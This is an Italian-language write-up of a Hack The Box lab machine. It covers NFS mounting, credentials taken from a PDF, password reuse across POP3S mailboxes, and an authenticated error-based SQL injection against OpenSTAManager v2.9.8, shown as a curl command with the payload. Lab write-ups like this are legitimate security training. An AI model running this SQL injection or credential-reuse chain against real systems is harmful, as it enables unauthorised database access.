# Machine Writeup: Enigma (HTB)

> [!info] Catena di Attacco
> `nmap` (NFS + POP3S) → Mount NFS (`New_Employee_access.pdf`) → Credenziali POP3S (`kevin`, poi `sarah`) → Scoperta VHost `support_001.enigma.htb` → Error-Based SQLi su `OpenSTAManager v2.9.8` (`GHSA-4xwv-49c8-fvhq`).

---

## 1. Enumerazione Iniziale (`nmap`)

```bash
nmap -sV -sC <IP>
```

Porte aperte rilevate:
- `22` SSH, `80` HTTP
- `110` POP3 / `995` POP3S, `143` IMAP
- `111` rpcbind, `2049` NFS

---

## 2. NFS Enumeration & Mount

Verifica dei volumi esportati (vedi [[06_Recon_Tools]]):

```bash
nmap -p 111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs <IP>
```

Risultato: volume `/srv/nfs/onboarding` contenente `New_Employee_access.pdf`.

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <IP>:/srv/nfs/onboarding /mnt/nfs
cp /mnt/nfs/New_Employee_access.pdf .
```

Dal PDF recuperiamo le credenziali: **`kevin` / `Enigma2024!`**.

---

## 3. Accesso POP3S (`995`)

La porta `110` senza cifratura rifiuta il login; usiamo POP3 over SSL (vedi [[06_Recon_Tools]]):

```bash
openssl s_client -connect <IP>:995 -crlf
```

Login e lettura inbox di `kevin`:
```text
USER kevin
PASS Enigma2024!
LIST
+OK 1 messages:
1 1473
.
retr 1
```

> [!warning] Case-sensitivity comando `retr`
> Il comando `RETR 1` maiuscolo può non funzionare su questo demone: usa `retr 1` in minuscolo!

Dal messaggio di `kevin` scopriamo l'utente `sarah`. Proviamo password reuse su `sarah`:
```text
USER sarah
PASS Enigma2024!
retr 1
```

Dall'email di `sarah` ricaviamo:
- Dominio interno: `http://support_001.enigma.htb` (da aggiungere in `/etc/hosts`)
- Credenziali web: **`admin` / `Ne3s4rtars78s`**

---

## 4. Web Exploitation (`OpenSTAManager v2.9.8` Error-Based SQLi)

Dopo il login sulla dashboard, identifichiamo `OpenSTAManager v2.9.8`, vulnerabile a SQL Injection autenticata (advisory [`GHSA-4xwv-49c8-fvhq`](https://github.com/advisories/GHSA-4xwv-49c8-fvhq)).

1. Salva il cookie di sessione autenticandoti con `curl`:
   ```bash
   curl -c cookies.txt -X POST "http://support_001.enigma.htb" \
     -d "username=admin&password=Ne3s4rtars78s"
   ```
2. Sfrutta la Error-based SQLi su `actions.php` (vedi [[02_SQLi#3. Error-Based SQLi (MySQL)]]):
   ```bash
   curl -b cookies.txt \
     -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
     "http://support_001.enigma.htb/actions.php?id_module=18"
   ```

Nell'output compare l'errore XPath con username del database e versione di MariaDB/MySQL.
